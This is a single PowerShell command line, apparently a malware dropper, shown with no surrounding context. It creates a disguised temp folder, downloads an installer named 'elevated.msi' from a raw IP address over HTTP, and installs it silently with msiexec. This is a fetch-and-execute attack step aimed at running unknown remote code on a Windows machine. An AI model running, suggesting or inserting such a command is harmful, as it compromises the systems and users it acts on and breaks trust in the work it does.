
mkdir -force $env:TEMP\TCD506A_.tmp;Invoke-WebRequest "http://83.212.111.137/down/elevated.msi" -OutFile "$env:TEMP\TCD506A_.tmp\elevated.msi";msiexec /q /i "$env:TEMP\TCD506A_.tmp\elevated.msi";

